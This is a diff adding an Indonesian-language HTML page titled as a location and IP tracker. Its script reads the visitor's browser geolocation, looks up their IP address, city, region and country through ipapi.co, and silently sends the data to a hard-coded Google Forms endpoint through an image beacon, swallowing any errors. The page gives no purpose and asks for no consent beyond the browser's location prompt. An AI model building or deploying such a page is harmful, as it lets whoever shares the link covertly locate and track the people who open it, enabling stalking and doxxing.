@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8"/>
+  <title>Tracker Lokasi + IP</title>
+</head>
+<body>
+  <h2>Sedang merekam lokasi…</h2>
+  <script>
+    const FORM_URL = 'https://docs.google.com/forms/d/e/1FAIpQLSdmCzOfz6cYaPXncwwhYKyeRX_ZUP6YhMmMWYKSSkGreLrURQ/formResponse';
+    const F = {
+      lat:  'entry.336954328',    // Latitude
+      long: 'entry.122334606',    // Longitude
+      acc:  'entry.1466949585',   // Accuracy
+      city: 'entry.1958665783',   // City
+      reg:  'entry.1713030934',   // Region
+      id:   'entry.2142024660',   // Country/ID
+      ip:   'entry.1095561107'  // <–– ganti dengan ID field IP Address
+    };
+
+    function submit(params) {
+      new Image().src = FORM_URL + '?' + new URLSearchParams(params);
+    }
+
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(
+        p => {
+          // Pertama fetch IP-nya
+          fetch('https://ipapi.co/json/')
+            .then(r => r.json())
+            .then(d => {
+              submit({
+                [F.lat]:  p.coords.latitude,
+                [F.long]: p.coords.longitude,
+                [F.acc]:  p.coords.accuracy,
+                [F.ip]:   d.ip
+              });
+            })
+            .catch(() => {
+              // Jika gagal ambil IP
+              submit({
+                [F.lat]:  p.coords.latitude,
+                [F.long]: p.coords.longitude,
+                [F.acc]:  p.coords.accuracy,
+                [F.ip]:   'unknown'
+              });
+            });
+        },
+        _=> fallbackIP(),
+        { timeout: 8000 }
+      );
+    } else {
+      fallbackIP();
+    }
+
+    function fallbackIP() {
+      fetch('https://ipapi.co/json/')
+        .then(r => r.json())
+        .then(d => {
+          submit({
+            [F.lat]:  d.latitude,
+            [F.long]: d.longitude,
+            [F.acc]:  'IP',
+            [F.city]: d.city,
+            [F.reg]:  d.region,
+            [F.id]:   d.country_name,
+            [F.ip]:   d.ip
+          });
+        })
+        .catch(()=>{/* silent */});
+    }
+  </script>
+</body>
+</html>
